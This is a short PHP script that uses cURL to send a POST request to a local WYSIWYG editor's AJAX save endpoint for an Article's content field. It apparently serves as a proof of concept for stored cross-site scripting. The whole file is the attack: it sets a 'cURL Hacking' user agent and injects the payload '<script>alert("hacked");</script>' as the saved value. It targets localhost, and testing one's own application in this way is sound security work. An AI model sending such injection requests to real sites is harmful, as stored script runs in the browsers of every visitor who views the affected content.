<?php
// Get cURL resource
$curl = curl_init();
// Set some options - we are passing in a useragent too here
curl_setopt_array($curl, array(
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_URL => 'http://localhost/html/wygiwys/ajax.php?action=save&id=320&model=Article&key=content',
    CURLOPT_USERAGENT => 'cURL Hacking',
	CURLOPT_POST => 1,
    CURLOPT_POSTFIELDS => array(
        'value' => '<script>alert("hacked");</script>'
    )
));
// Send the request & save response to $resp
$resp = curl_exec($curl);

echo $resp;
// Close request to clear up some resources
curl_close($curl);
?>
